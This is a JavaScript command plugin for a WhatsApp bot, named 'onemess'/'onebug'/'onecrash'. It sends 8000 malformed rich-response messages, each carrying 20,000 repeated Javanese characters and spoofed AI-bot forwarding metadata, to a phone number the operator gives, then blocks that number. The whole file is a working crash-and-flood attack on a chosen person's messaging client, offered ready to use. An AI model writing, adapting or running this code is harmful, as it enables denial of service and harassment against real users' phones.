import "../settings.js";

export default {
  command: ["onemess", "onebug", "onecrash"],
  group: false,
  premium: false,
  limit: false,
  admin: false,
  creator: true,
  botAdmin: false,
  privates: false,
  usePrefix: true,
  disable: false,

  code: async (m, { RyuuBotz, reply, text, qbotz }) => {
    if (!text) return reply("*Mana targetnya* 🤔")

    const rawTarget = text.replace(/\D/g, "")
    const target = rawTarget + "@s.whatsapp.net"
    const teks = "ꦾ".repeat(20000);
    
    async function sendCode(target, conn, m, code, teksnya) {
    const submessages = [{
            messageType: 2,
            messageText: teksnya
        },
        {
            messageType: 5,
            codeMetadata: {
                codeLanguage: "plaintext",
                codeBlocks: code.split(/(\s+)/).map(v => ({
                    highlightType: 0,
                    codeContent: v
                }))
            }
        }
    ]

    const content = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        botForwardedMessage: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages,
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "867051314767696@bot"
                        },
                        forwardOrigin: 4
                    }
                }
            }
        }
    }

    await conn.relayMessage(target, content, {
        quoted: m
    })
}

    await reply("*Bentar yahhh*")

    for (let i = 0; i < 8000; i++) {
      await sendCode(target, RyuuBotz, m, teks, teks);
      await global.sleep(1000);
    }
    await RyuuBotz.updateBlockStatus(target, "block");
    await reply("*Done yapp*");
  }
}